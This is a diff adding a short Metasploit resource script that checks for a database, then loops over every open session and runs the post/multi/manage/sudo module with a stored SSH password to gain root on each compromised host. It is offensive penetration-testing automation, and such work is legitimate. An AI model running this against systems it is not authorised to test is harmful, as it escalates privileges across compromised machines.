@@ -1,0 +1,20 @@
+<ruby>
+
+# Test and see if we have a database connected
+begin
+	framework.db.hosts
+rescue ::ActiveRecord::ConnectionNotEstablished
+	print_error("Database connection isn't established")
+	return
+end
+
+run_single("use post/multi/manage/sudo")
+framework.sessions.each_key do |session|
+	run_single("set SESSION #{session}")
+	print_status("Running #{active_module.fullname} against session #{session}")
+	run_single("set PASSWORD #{framework.datastore["SSH_PASSWORD"]}")
+	run_single("exploit")
+	sleep 1
+end
+
+</ruby>
